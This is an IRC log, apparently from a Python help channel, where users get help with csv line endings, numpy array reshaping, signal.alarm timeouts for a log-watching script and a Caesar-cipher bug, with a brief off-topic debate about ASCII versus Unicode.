[17:49:00] <fearnothing> Yhg1s - can you clarify what is meant by 'single file with deterministic content' please?
[17:49:37] <Yhg1s> fearnothing: I mean instead of having lines 13-37, get some file to add to it and just run 'zf.write(thefile, arcname='somefilename')'
[17:49:47] *** Quits: chachan_ (~chachan@ec2-35-164-24-42.us-west-2.compute.amazonaws.com) (Ping timeout: 245 seconds)
[17:49:47] *** Joins: im0nde (~im0nde@2a0a-a540-edb0-0-3889-c878-9b67-5ba0.ipv6dyn.netcologne.de)
[17:50:02] <ali1234> i'm not too sure about the implementation though
[17:50:05] <Yhg1s> fearnothing: also getting rid of anything else the program does.
[17:50:15] <newpy> if I have 2+ pandas dataframes with different column names (eg A/B/C/D/E/F vs U/V/W/X/Y/Z) and I want to combine them into a new dataframe, but I only care about 3 columns
[17:50:17] <Yhg1s> ali1234: what's there to be unsure about?
[17:50:19] <newpy> how would I go about that?
[17:50:34] <ali1234> Yhg1s: i mean, how does it work? it just calls it's arguments: https://github.com/python/cpython/blob/master/Lib/importlib/_bootstrap.py#L210
[17:50:52] *** Joins: Elodin (~weechat@unaffiliated/padawan)
[17:50:55] <ali1234> oh hang on the comment explains that too
[17:51:02] <Yhg1s> ali1234: the Python code doesn't do anything. import.c does the magic.
[17:51:05] <fearnothing> Yhg1s: I will try executing this function outside of the rest of the script for a start
[17:51:06] <ali1234> right
[17:51:53] *** Quits: alicefreak (75c753cf@gateway/web/freenode/ip.117.199.83.207) (Quit: Page closed)
[17:52:02] <newpy> so I want to take every row from df1 (but just column A, C, E) and every row from df2 (but just column U, Y, Z), and combine them into a new dataframe with column names ('addr','city','state')
[17:52:30] *** Joins: kurkale6ka (~kurkale6k@84.45.99.125)
[17:52:33] *** Joins: antgel (~topdog@87.71.0.54)
[17:53:04] *** Quits: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[17:53:36] *** Quits: stitched_unicorn (~textual@softbank126015064164.bbtec.net) (Quit: stitched_unicorn)
[17:54:38] *** Quits: light2yellow (~l2y@185.220.70.149) (Quit: light2yellow)
[17:54:41] *** Quits: geert2705 (~geert2705@ip4da85734.direct-adsl.nl) (Remote host closed the connection)
[17:55:01] *** Joins: Oddity (~Oddity@unaffiliated/oddity)
[17:55:02] *** Quits: etcetera (~etcetera@about/csharp/regular/etcetera) ()
[17:55:23] *** Joins: Gustavo6046 (~Gustavo60@unaffiliated/gustavo6046)
[17:55:44] *** Joins: Ulti (~matt@kali.vm.bytemark.co.uk)
[17:55:52] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[17:56:42] <Ulti> if I'm using the standard csv library and am dealing with a file with line terminators of the form \r\r\n is there an easy work around this, such as some kind of IO wrapper I can put around the file handle that regex replaces the \r\r to \r
[17:57:23] *** Joins: th3_p3n3tr4t0r (~th3_p3n3t@2a02:8108:1c0:8edf:f518:c416:552b:cf)
[17:57:40] <Wooble> Ulti: I think if you open the file with newline='\r' it should do the right thing, assuming python 3.
[17:57:41] <Ulti> assuming this https://docs.python.org/3/library/csv.html#csv.Dialect.lineterminator  means what I think it does, and that my code that sniffs the CSV is only finding \r\n as the line ending
[17:57:43] *** Quits: kurkale6ka (~kurkale6k@84.45.99.125) (Ping timeout: 265 seconds)
[17:58:00] *** Quits: sdoherty (sdoherty@nat/redhat/x-kydiyvltmqqipodt) (Ping timeout: 260 seconds)
[17:58:04] <Wooble> well, maybe not actually.
[17:58:08] *** Joins: abyssal_trip_ (40d37780@gateway/web/freenode/ip.64.211.119.128)
[17:58:09] *** Joins: edne (~edne@net-2-42-74-190.cust.vodafonedsl.it)
[17:58:19] *** Joins: Blevotin (~Blevotin@93.185.29.14)
[17:58:19] *** Joins: RickDeckard (~tgburrin@108.60.152.194)
[17:58:38] <Ulti> Im at the stage where I need to hack this rather than have a super great solution, Im not beyond slurping the whole file and trying my luck with StringIO
[17:58:48] <Ulti> but does kind of hurt my soul
[17:58:54] <Kaedenn> I'm using multiprocessing. How can I schedule events to occur at specific times or at specific intervals?
[17:58:55] <Yhg1s> Ulti: how did you end up with a file with those line endings? Fixing the file would be a good idea. You can do this with a file-like object of your own, though.
[17:59:01] *** Joins: nelsnelson (~nelsnelso@2605:6000:1023:807e:ed01:35e1:6d2e:9ff9)
[17:59:05] *** Joins: rpkilby (~rpkilby@152.7.255.194)
[17:59:18] *** Quits: Driveways_ (~Driveways@216.228.46.200) (Quit: ZNC 1.7.0 - https://znc.in)
[17:59:33] <Yhg1s> Ulti: csv.reader() takes any iterable that yields lines, so you can just do 'csv.reader(line.replace('\r\r\n', '\r\n') for line in real_file)'
[17:59:47] *** Quits: kushalAgrawal (uid279683@gateway/web/irccloud.com/x-gfessvnkimtsicrp) (Quit: Connection closed for inactivity)
[17:59:49] <Ulti> Yhg1s: yeah tell me aobut it :3 this is me integrating with a third party... where I wouldn't put it past them to poison the data on purpose
[17:59:49] <Yhg1s> Kaedenn: multiprocessing has no facilities for this.
[17:59:51] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[17:59:58] <zalt> Kaedenn: you can use the time.sleep() function
[18:00:09] <Ulti> Yhg1s: orly!
[18:00:11] <Ulti> thats perfect
[18:00:12] <Kaedenn> Yhg1s: Understood; I'll handle this in the main process then
[18:00:13] <Yhg1s> Ulti: I would make sure this isn't happening some other way, though.
[18:00:17] *** Joins: amirpro (~amirpro@41.235.244.66)
[18:00:28] <Ulti> I thought it had to be IO shaped
[18:00:30] <Yhg1s> Ulti: like writing the file in text mode and manually writing \r\n.
[18:00:35] *** Quits: CrazyEddy (crazyed@wrongplanet/CrazyEddy) (Remote host closed the connection)
[18:00:41] <abyssal_trip_> may want to put a r in front of the string to escape the "escape" chars
[18:00:41] *** Quits: Hasimir (~hfenring@unaffiliated/hasimir) (Ping timeout: 240 seconds)
[18:00:43] <zalt> i think ayncio's event loops are more fit for this
[18:00:46] <Ulti> oh trust me the bytes are there in the file
[18:00:51] *** Quits: n35xdxb0 (~n35xdxb0@81.171.98.48) (Ping timeout: 240 seconds)
[18:00:54] <Yhg1s> abyssal_trip_: no, that would very much do the wrong thing.
[18:00:56] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 276 seconds)
[18:01:00] <Ulti> Excel puts in a tonne of blank rows too which is special
[18:01:10] *** Joins: graphene (~graphene@46.101.134.251)
[18:01:12] *** Quits: nojeffrey (~nojeffrey@115.70.166.60) (Read error: Connection reset by peer)
[18:01:14] <Yhg1s> Ulti: if the file contains \r\r\n line endings, Excel will see that as two line ending,s yes.
[18:01:20] <Ulti> yup
[18:01:22] <abyssal_trip_> is the function returning a string...?
[18:01:28] <abyssal_trip_> ohhh
[18:01:29] <abyssal_trip_> excel
[18:01:30] <abyssal_trip_> got it
[18:01:37] <Yhg1s> Ulti: in any case, https://docs.python.org/3/library/csv.html#csv.reader mentions the argument can be any iterable.
[18:01:49] <Ulti> yeah I missed it, thanks!
[18:01:54] <zalt> is there a way to guarentee memory continuity in python?
[18:01:56] <Ulti> that will certainly do for me
[18:02:15] <Ulti> as it wont really affect any of the other line endings.... i.e. actual normal line endings
[18:02:22] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[18:02:29] *** Joins: Wr4i7h (~abcd@a85-139-11-90.cpe.netcabo.pt)
[18:02:38] <Yhg1s> abyssal_trip_: ... no, that's not related. Ulti wants to replace carriage return, carriage return, newline. Not backslash-r backslash-r backslash-r. '\r\r\n' and r'\r\r\n' are different strings.
[18:02:51] <Yhg1s> zalt: in what way?
[18:02:59] *** Joins: nojeffrey (~nojeffrey@60.166.70.115.static.exetel.com.au)
[18:03:02] *** Joins: italic (~italic@unaffiliated/italic/x-8958156)
[18:03:07] *** Joins: realnot (~realnot@unaffiliated/realnot)
[18:03:09] *** Joins: n35xdxb0 (~n35xdxb0@cpc130684-camd16-2-0-cust846.know.cable.virginm.net)
[18:03:10] <abyssal_trip_> zalt what ide are u using?
[18:03:21] <zalt> "vim"
[18:03:28] <abyssal_trip_> lol
[18:03:42] <abyssal_trip_> i would not know
[18:03:45] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:03:53] <zalt> Yhg1s: i mean for uses like creating performant datastructures
[18:04:04] <zalt> or is that part of python reserved for the "C" side of things? :P
[18:04:06] <Yhg1s> zalt: that's not really something you can do in Python.
[18:04:25] <Yhg1s> zalt: you don't have control over these things, and the overhead of Python very much swamps out those details (on the Python object level, in any case)
[18:04:39] *** Quits: pro_z (~pro_z@93.84.41.139) (Remote host closed the connection)
[18:04:40] <Yhg1s> zalt: you can define types in C that do whatever you want, of course.
[18:04:54] *** Quits: newpy (~ops2@lsvl-pf.massivenetworks.net) (Quit: Going offline, see ya! (www.adiirc.com))
[18:05:02] <abyssal_trip_> You can play with heap sizes and othre memory options in Pycharm. It definitely made a difference
[18:05:07] *** Joins: StygianBlues (~StygianBl@2600:380:1823:768b:9112:d0e7:390c:33f8)
[18:05:12] *** Quits: TidB (~TidB@pD9FCEBC9.dip0.t-ipconnect.de) (Remote host closed the connection)
[18:05:16] *** Joins: LiftLeft2 (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed)
[18:05:25] <zalt> hmf, seeing that it is possible for some modules to be very fast makes python unique in a way
[18:05:31] *** Joins: TidB (~TidB@pD9FCEBC9.dip0.t-ipconnect.de)
[18:05:32] <nedbat> zalt: what sorts of data structures did you have in mind? Perhaps they are already available?
[18:05:34] *** Joins: Cryp71c (~Cryp71c@12.1.130.66)
[18:05:36] <Yhg1s> abyssal_trip_: that doesn't affect the Python program.
[18:05:42] <abyssal_trip_> you can always modify the python source code ;)
[18:05:54] <abyssal_trip_> it does in pycharm?
[18:06:02] <NoImNotNineVolt> isn't that what numpy is for?
[18:06:04] <zalt> nedbat: heh, i bet they are, but i like reinventing wheels
[18:06:05] <Yhg1s> abyssal_trip_: I can imagine it affects pycharm, sure.
[18:06:06] *** Quits: platvoeten (~platvoete@178-85-122-247.dynamic.upc.nl) (Ping timeout: 260 seconds)
[18:06:21] <Yhg1s> abyssal_trip_: PyCharm is not really written in Python.
[18:06:25] <abyssal_trip_> yeah, dont know about other IDEs
[18:06:26] *** Quits: LiftLeft (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed) (Ping timeout: 255 seconds)
[18:06:32] <Yhg1s> abyssal_trip_: the question wasn't about IDEs.
[18:06:44] <nedbat> zalt: what wheel will you start with? :)
[18:06:45] *** Quits: mtellez_ (bbf05f31@gateway/web/freenode/ip.187.240.95.49) (Quit: Page closed)
[18:06:46] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 256 seconds)
[18:06:56] <abyssal_trip_> I know that. I was responding to someone else
[18:07:15] <Ulti> hah now I just need to set the open to handle that dumb line ending ;)
[18:07:24] *** Joins: ocx32 (4d2afadc@gateway/web/freenode/ip.77.42.250.220)
[18:07:48] <nedbat> abyssal_trip_: i see how the two conversations crossed.  that's why i always use a nick to respond to people.
[18:08:04] <zalt> nedbat: i don't know, i already know a bit of c, i'll probably start with implementing some string related datastructures since that is what i'm reading about now
[18:08:24] * zalt won't touch unicode, just plain old ascii :P
[18:08:30] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 260 seconds)
[18:08:30] <abyssal_trip_> firsts time on here...I tried clicking?
[18:08:35] <abyssal_trip_> on the name, but nothing
[18:08:40] *** Joins: bablux (~bablux@gateway/tor-sasl/cyril1)
[18:08:42] <han-solo> just name tab
[18:08:43] *** Quits: realnot (~realnot@unaffiliated/realnot) (Ping timeout: 256 seconds)
[18:08:50] *** Joins: xpunkt (~philipp@HSI-KBW-085-216-094-126.hsi.kabelbw.de)
[18:08:53] <han-solo> or some first few letters and tab
[18:08:58] *** Joins: inad922 (~inad925@outbound.hortonworks.com)
[18:09:07] <ocx32> hello all, i am trying to develop a program that does the following: 1) read from a log file the new lines , if a pattern matches, i want to execute a command and start a timeout of 60sec. if at any point in time the log file gets updated and contains a pattern, the program detects it and resets the counter to 60 sec.  if the timer times out after 60 sec the program  is killed. How easy is this implemented in python ? coz bash script i
[18:09:09] <NoImNotNineVolt> zalt++; keep fighting the good fight!
[18:09:11] *** Quits: rendar (~rendar@unaffiliated/rendar) ()
[18:09:32] <Cryp71c> New to python, I'm needing to turn a 2d array of shape (10, 10) into a 3d array of shape (10, 10, 3) by repeating each of the 2d values 2 more times in a new dimension of the array. e.g. [[0, 0, 0, 1, 1, 1, 1, 0, 0, 0]] becomes [[[0,0,0], [0,0,0], [0,0,0], [1,1,1], [1,1,1], [1,1,1], [1,1,1], [0,0,0], [0,0,0], [0,0,0]]]
[18:09:37] *** Quits: xpunkt (~philipp@HSI-KBW-085-216-094-126.hsi.kabelbw.de) (Client Quit)
[18:09:47] *** Quits: jb1123 (~Thunderbi@2a02:a03f:5230:2400:4db:7475:7a25:44a2) (Ping timeout: 245 seconds)
[18:10:05] <abyssal_trip_> use the threading module, or asyncio
[18:10:06] *** Joins: smt` (~smt@unaffiliated/smt)
[18:10:13] *** Quits: Naresh (uid2823@gateway/web/irccloud.com/x-fdjsqzrenpiqpveb) (Quit: Connection closed for inactivity)
[18:10:25] <Cryp71c> I've been going over this for an hour or so and can't wrap my head around whether or not its even possible with python slicing
[18:10:45] <ali1234> it's not
[18:10:47] <ali1234> use numpy
[18:10:47] <Yhg1s> Cryp71c: [ [ [item]*3 for item in row ] for row in your_list ]
[18:10:48] *** Quits: jjulian_ (~jjulian@i5DB5037D.pool.tripleplugandplay.com) (Remote host closed the connection)
[18:10:58] <cdunklau> Cryp71c: vstack probably
[18:11:04] <cdunklau> assuming numpy
[18:11:06] *** Joins: rns (rns@gateway/vpn/privateinternetaccess/rns)
[18:11:09] <Yhg1s> Cryp71c: you could use slicing, too, sure. It wouldn't be better than just iterating.
[18:11:25] *** Joins: sdoherty (sdoherty@nat/redhat/x-urwnubgubzpdmjqj)
[18:11:34] *** Quits: Elodin (~weechat@unaffiliated/padawan) (Quit: WeeChat 2.1)
[18:11:45] <Yhg1s> ocx32: your question was cut off at "coz bash script i".
[18:11:57] *** Quits: tom__ (~tom@p54B0E142.dip0.t-ipconnect.de) (Ping timeout: 240 seconds)
[18:12:08] <han-solo> find it very difficult ? :)
[18:12:14] *** Joins: Blevotin_ (~Blevotin@93.185.19.104)
[18:12:48] *** Quits: Blevotin_ (~Blevotin@93.185.19.104) (Max SendQ exceeded)
[18:12:51] *** Quits: dramsey_ (~dramsey@c-68-37-94-119.hsd1.mi.comcast.net) (Ping timeout: 240 seconds)
[18:13:18] *** Joins: Blevotin_ (~Blevotin@93.185.19.104)
[18:13:45] <_habnabit> NoImNotNineVolt, that's a weirdly xenophobic statement
[18:13:49] *** Quits: smt (~smt@unaffiliated/smt) (Ping timeout: 256 seconds)
[18:13:49] *** Quits: Haudegen (~quassel@178.115.237.87) (Ping timeout: 256 seconds)
[18:14:05] *** Quits: Blevotin_ (~Blevotin@93.185.19.104) (Max SendQ exceeded)
[18:14:09] *** Quits: inad922 (~inad925@outbound.hortonworks.com) (Ping timeout: 264 seconds)
[18:14:12] <Cryp71c> Thanks guys, that's exactly what I needed
[18:14:17] *** Joins: Haudegen (~quassel@178.115.237.87)
[18:14:17] <NoImNotNineVolt> _habnabit: my native language can't be represented in ascii, so i'm not sure xenophobic is the right word.
[18:14:28] <WhileTrue> after a whole while of wrestling (!), I got it both with for and while: https://paste.debian.net/1031746/
[18:14:29] <fearnothing> ok Yhg1s, dunno what I've done differently, but it is now working
[18:14:36] *** Joins: Blevotin_ (~Blevotin@93.185.19.104)
[18:14:41] <_habnabit> NoImNotNineVolt, then why would you want ascii-only..
[18:14:52] <cdunklau> Cryp71c: i think you just want np.stack((a, a, a), axis=2)
[18:14:56] <NoImNotNineVolt> _habnabit: to facilitate global intercommunication
[18:15:04] <zalt> lol
[18:15:07] *** Quits: rns_ (~rns@2601:345:8302:b77:8872:3ad:1834:baac) (Ping timeout: 265 seconds)
[18:15:12] <_habnabit> NoImNotNineVolt, using, what, utf-7?
[18:15:12] <Yhg1s> NoImNotNineVolt: it... wouldn't.
[18:15:20] *** Quits: xliiv (~xliiv@d89-122.icpnet.pl) (Ping timeout: 276 seconds)
[18:15:31] <dude-x> NoImNotNineVolt romanizing Japanese would be very hard to read.
[18:15:32] <fearnothing> but thank you for your suggestions, even if I don't know what sorted it out :)
[18:15:33] <Yhg1s> NoImNotNineVolt: how can you communicate if you can't even spell your own name?
[18:15:36] *** Quits: Blevotin (~Blevotin@93.185.29.14) (Ping timeout: 265 seconds)
[18:15:42] <NoImNotNineVolt> it's more realistic to expect people to adopt a single lingua franca than it is to expect them to learn all of each others languages.
[18:15:47] <Cryp71c> cdunklau, I'll look at that as well
[18:16:11] <Yhg1s> NoImNotNineVolt: it's never been about learning all the languages.
[18:16:21] <NoImNotNineVolt> Yhg1s: indeed, because it's never been about global intercommunication.
[18:16:24] <NoImNotNineVolt> that's my point.
[18:16:33] <ocx32> coz bash script is giving me hard time thank you
[18:16:38] *** Quits: GenteelBen (GenteelBen@cpc129112-lutn14-2-0-cust66.know.cable.virginm.net) ()
[18:16:39] <ocx32> Yhg1s:  ^
[18:16:41] <abyssal_trip_> bash script is hell
[18:16:45] <Yhg1s> NoImNotNineVolt: computers are used for a lot more. Your suggestion will not work.
[18:17:02] *** Joins: pro_z (~pro_z@93.84.41.139)
[18:17:03] <Yhg1s> ocx32: it's not harder in Python than in any other language. Easier than in bash, probably, though.
[18:17:04] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:17:05] <ocx32> yes it is
[18:17:25] <zalt> the only thing we have against unicode is that it's difficult for programmers to work with compard to ascii :P
[18:17:34] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[18:17:42] <_habnabit> zalt, yes, human language is hard
[18:17:42] <NoImNotNineVolt> Yhg1s: i'm aware of the long history of incompatible character encodings that preceded the development of unicode and its various encodings.
[18:18:05] <Yhg1s> zalt: I would offer bit.ly/unipain.
[18:18:24] <ali1234> ascii is too hard to deal with. we should have just stayed with ebdic
[18:18:29] <han-solo> Everyone speaks English. Solved! :)
[18:18:31] <ocx32> Yhg1s: what are the building blocks, what elements should i use
[18:18:35] <cdunklau> Cryp71c: yeah that's the one
[18:19:13] <Yhg1s> ocx32: subprocess.Popen and file I/O. Possibly the 're' module depending on what kind of patterns you're looking for.
[18:19:13] <NoImNotNineVolt> ali1234: i would've been okay with that too. i personally prefer ebcdic, but bcd is falling out of favor anyway.
[18:19:43] *** Quits: abyssal_trip_ (40d37780@gateway/web/freenode/ip.64.211.119.128) (Quit: Page closed)
[18:19:47] <han-solo> ocx32: I think debeaz has done some thing similar to tail -f using generators, might help :)
[18:19:53] <ocx32> how about the timer what should i use to have a centralized timer
[18:19:57] *** Quits: sdwrage (~textual@64.247.67.53) (Ping timeout: 265 seconds)
[18:20:05] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[18:20:10] *** Quits: rpkilby (~rpkilby@152.7.255.194) (Remote host closed the connection)
[18:20:15] <dude-x> NoImNotNineVolt if you look at how Hong Kong, India, Nigeria, British Caribbean speaks English, it might as well be another language. A global language won't work well if it doesn't adopt the characteristics of the native's language.
[18:20:15] <Yhg1s> ocx32: I'm not sure what 'centralized' means. You would keep track of when you started a job, sure.
[18:20:16] *** Quits: Anticom (~Anticom@2001:67c:2184:410:f591:5282:69d0:a3f9) (Quit: Leaving)
[18:20:18] *** Quits: agent_white (~agent_whi@unaffiliated/agent-white/x-6197888) (Quit: brb)
[18:20:20] <cdunklau> Cryp71c: https://bpaste.net/show/6081303b70fb
[18:20:20] <Yhg1s> ocx32: the datetime module helps with this.
[18:20:32] *** semeion is now known as mnemonic
[18:20:33] <NoImNotNineVolt> dude-x: it's still a step towards mutual intelligibility.
[18:20:33] *** Joins: mefistofeles (~mefistofe@unaffiliated/mefistofeles)
[18:20:41] <zalt> Yhg1s: thanks, that seems to be a nice intro
[18:20:47] <NoImNotNineVolt> as opposed to unicode, which is a step backwards if anything.
[18:20:57] <dude-x> i'm arguing it might as well be another language
[18:21:21] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 248 seconds)
[18:21:49] *** Joins: jb1123 (~Thunderbi@2a02:a03f:5230:2400:39ff:4a5a:ce7b:6748)
[18:21:50] <NoImNotNineVolt> indeed, and even then, you're much closer to mutual intelligibility. i don't know much japanese, but i have a much easier time with romaji than any of their kana.
[18:22:01] *** Joins: realnot (~realnot@unaffiliated/realnot)
[18:22:15] <Yhg1s> dude-x: it's very much besides the point, though, of whether ASCII is enough for everyone. (It isn't.)
[18:22:17] *** Parts: Kaedenn (~kaedenn@unaffiliated/kaedenn) ()
[18:22:19] <NoImNotNineVolt> same with russian; i can somewhat make out some russian transliterated to latin, but cyrillic is hopeless.
[18:22:23] <nedbat> NoImNotNineVolt: let's drop this, it's off-topic.
[18:22:24] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[18:22:28] <NoImNotNineVolt> i agree, apologies.
[18:23:02] *** Quits: lektrik (~mayday_ja@burlon0233w-lp140-06-50-101-65-159.dsl.bell.ca) (Ping timeout: 276 seconds)
[18:23:05] *** Joins: amirpro (~amirpro@41.235.244.66)
[18:23:08] *** Joins: dramsey_ (~dramsey@2603:3015:ed1:e000:80b3:5d3a:dc04:4b5e)
[18:23:27] *** squirrel is now known as oakkitten
[18:23:42] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[18:23:48] *** Quits: rudrab (~rudrab@14.139.59.140) (Quit: rudrab)
[18:23:49] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:23:50] <Wooble> ascii can't even do perfectly cromulent UK english spellings. granted most american usage doesn't use diacritics, unless you're working for the new yorker.
[18:25:14] *** Joins: rudrab (~rudrab@14.139.59.140)
[18:25:14] <ocx32> Yhg1s: so idea here is to start a timer, whenever a new hit in pattern occurs, reset the timer to an initial value, in the same time i have a while loop that is incrementing this timer every second and if it reaches some time it kills a process?
[18:25:24] *** Joins: polarfire (~polarfire@d58c56d2.rev.dansknet.dk)
[18:25:42] *** Joins: merc88 (~merc88@unaffiliated/merc88)
[18:25:54] <ocx32> so in the loop i have a timer = timer+1 and sleep 1 sec ?
[18:25:59] <Yhg1s> ocx32: no, you don't "start a timer" that you reset. You keep track of the time.
[18:26:00] *** Joins: drexl (~drexl@cpc130676-camd16-2-0-cust445.know.cable.virginm.net)
[18:26:02] *** Joins: agent_white (~agent_whi@unaffiliated/agent-white/x-6197888)
[18:26:26] <ocx32> ?
[18:26:30] <Yhg1s> ocx32: so you read lines from the file, and check the current time, and if too much time has elapsed, you kill the process.
[18:26:31] *** Quits: RickDeckard (~tgburrin@108.60.152.194) (Remote host closed the connection)
[18:26:41] *** Joins: AvianFlu (~avianflu@freedom.sexy)
[18:27:03] *** Quits: roadie (~user@2a02:8108:f40:17f1:953:d4f3:7b58:ff8d) (Ping timeout: 256 seconds)
[18:27:04] *** Quits: nixjdm (~nixjdm@2605:a601:1135:a400:54aa:e522:68c8:8482) (Remote host closed the connection)
[18:27:05] <han-solo> start = time.time(); while something: if time.time() - start > 60: do_kill_stuff() ? :)
[18:27:08] *** Joins: zaltation (~lambda443@unaffiliated/lambda443)
[18:27:10] *** Joins: RickDeckard (~tgburrin@152.179.78.138)
[18:27:40] *** Quits: sauvin (sauvin@about/linux/staff/sauvin) (Read error: Connection reset by peer)
[18:27:41] <NoImNotNineVolt> i would do:  end = time.time() + start
[18:27:48] <NoImNotNineVolt> err, + 60
[18:27:56] *** Joins: publio (~publio@unaffiliated/publio)
[18:28:08] <NoImNotNineVolt> no need to redo the arithmetic for every iteration. but then again, it's python, so that doesn't really matter.
[18:28:15] <han-solo> or signal.alarm is better ?
[18:28:17] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 248 seconds)
[18:28:17] *** Quits: zalt (~lambda443@unaffiliated/lambda443) (Ping timeout: 248 seconds)
[18:28:27] *** Joins: lektrik (~mayday_ja@burlon0233w-lp140-03-69-156-38-155.dsl.bell.ca)
[18:28:45] <dude-x> i would use monotonic.time() if you don't want things like DST or NTT time changes affecting timeouts
[18:28:46] <ocx32> Yhg1s:  i only read lines when there is data, sometimes no data is there and i need to expire the timer
[18:28:52] *** Quits: philr (~phil@ppp121-45-86-74.bras1.adl6.internode.on.net) (Ping timeout: 268 seconds)
[18:28:59] *** Joins: tuxiano (~tuxiano@2a02:8070:89d4:aa00:bd60:c5ab:1e16:db05)
[18:29:47] *** Joins: merc88_ (~merc88@unaffiliated/merc88)
[18:30:00] *** Joins: inad922 (~inad925@outbound.hortonworks.com)
[18:30:06] <Yhg1s> ocx32: there are different ways you can do this. You can use non-blocking reads so you don't sit waiting for new data, or you can check if there's something to read before trying to read it, or you can use signal.alarm to send a signal after a certain amount of time (not on Windows), or you can use an event loop to combine these things (like asyncio or twisted).
[18:30:39] <ocx32> i am using linux
[18:30:40] <Yhg1s> dude-x: timezone changes don't affect time.time().
[18:30:42] <ocx32> need the easier way
[18:30:50] <Yhg1s> (hw clock adjustments do, though.)
[18:30:51] *** Quits: greg_f (~greg@altlinux/developer/greg) (Ping timeout: 240 seconds)
[18:30:52] <dude-x> Yhg1s true it's utc
[18:30:57] *** Quits: merc88 (~merc88@unaffiliated/merc88) (Ping timeout: 248 seconds)
[18:30:57] *** merc88_ is now known as merc88
[18:31:00] <Yhg1s> ocx32: probably signal.alarm then.
[18:31:01] *** Quits: chachan (~chachan@196.40.47.129) (Remote host closed the connection)
[18:31:23] *** Quits: amirpro (~amirpro@41.235.244.66) (Remote host closed the connection)
[18:31:26] *** Joins: nixjdm (~nixjdm@2605:a601:1135:a400:ac06:7b51:6d64:9e35)
[18:32:02] <ocx32> ok so i do a file read, if pattern match i set a signal?
[18:32:08] *** canarts is now known as stranac
[18:32:11] *** Joins: amirpro (~amirpro@41.235.244.66)
[18:32:35] *** Joins: rpkilby (~rpkilby@152.7.255.194)
[18:32:53] <Yhg1s> ocx32: call signal.alarm, yes.
[18:33:05] *** Quits: rjdp9736 (~rjdp9736@49.205.216.204) (Ping timeout: 248 seconds)
[18:33:07] *** Joins: impermanence (6cab87b9@gateway/web/cgi-irc/kiwiirc.com/ip.108.171.135.185)
[18:33:08] *** Joins: bzdocha (~bzdocha__@adsl-dyn241.78-99-15.t-com.sk)
[18:33:31] <WhileTrue> why might this be happening? https://paste.debian.net/plain/1031749
[18:33:51] *** Quits: carlomazzaferro (~carlomazz@50.225.11.6) (Ping timeout: 256 seconds)
[18:34:00] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[18:34:04] *** Joins: rememberYou (~user@unaffiliated/rememberyou)
[18:34:28] <Wooble> WhileTrue: you need to make it wrap around to z if it's less than a.
[18:34:35] *** Joins: nonconvergent (c72f2503@gateway/web/freenode/ip.199.47.37.3)
[18:34:40] <nonconvergent> Hi.
[18:34:43] <Yhg1s> WhileTrue: what is ord('e'), and what is ten less than ord('e'), and what is chr() of that number?
[18:34:48] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[18:35:01] <han-solo> %24
[18:35:03] <ocx32> ok and i reset the alarm in between on new pattern?
[18:35:07] <han-solo> or was it 26 :/
[18:35:29] *** Quits: cyanide (~cyanide@unaffiliated/cyanide) (Ping timeout: 276 seconds)
[18:35:38] <han-solo> 26 it is :)
[18:35:40] *** Joins: graphene (~graphene@46.101.134.251)
[18:36:04] <Yhg1s> ocx32: yes. calling signal.alarm again replaces the old alarm.
[18:36:25] <Yhg1s> ocx32: you have to register a signal handler for SIGALRM, which will get called when the signal is delivered (when the alarm timer runs out without being reset)
[18:36:41] *** Joins: Code4Dopamine (d8045cc2@gateway/web/freenode/ip.216.4.92.194)
[18:36:42] *** Joins: grateful (~grateful@unaffiliated/grateful)
[18:37:00] <ocx32> Yhg1s: the signal handler would mainly kill the process
[18:37:52] <han-solo> raise SystemExit or sys.exit, whatever you prefer then
[18:37:55] *** Joins: Ignacy (~Ignacy@cA0AD00C3.dhcp.as2116.net)
[18:38:01] <ocx32> Yhg1s: and mainly i can check memory on the pattern matches to make sure thatthe process is there rigght?
[18:38:07] *** Quits: adoua (~adoua@unaffiliated/adoua) (Ping timeout: 268 seconds)
[18:38:42] *** Joins: hishamn__ (~hisham@182.177.0.207)
[18:38:45] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[18:38:46] *** Quits: Cryp71c (~Cryp71c@12.1.130.66) (Quit: Leaving)
[18:38:53] *** Parts: |oLa| (~|_oLa_|@2a00:23c5:8c0e:9900:d996:2f3e:f2a7:86e6) ()
[18:38:58] *** Joins: sdwrage (~textual@64.247.67.53)
[18:39:23] <WhileTrue> Yhg1s,  ord('e') is 101, chr(91) is [
[18:39:25] <Yhg1s> ocx32: I don't know what you mean by 'check memory', sorry.
[18:39:30] <WhileTrue> there are 10 places from e back to u ord("e), however 'ord("u")-ord("e")' is 16
[18:39:40] <WhileTrue> there are 10 places from e back to u, however 'ord("u")-ord("e")' is 16
[18:39:42] <ocx32> i mean check processes to make sure the process is there, if not run it
[18:39:45] <han-solo> I think, sys.exit would be better in this case, since this is way the process ends, and i don't want it to send message ( if any) to stderr
[18:39:47] <ocx32> but i dont want duplicates
[18:39:48] *** Joins: root3d (~root3d@unaffiliated/root3d)
[18:39:57] <Yhg1s> WhileTrue: but you're not doing anything other than subtracting 10. You're not wrapping around to 'z'.
[18:40:08] <Yhg1s> WhileTrue: so chr(91) being '[' is why you get the result you see.
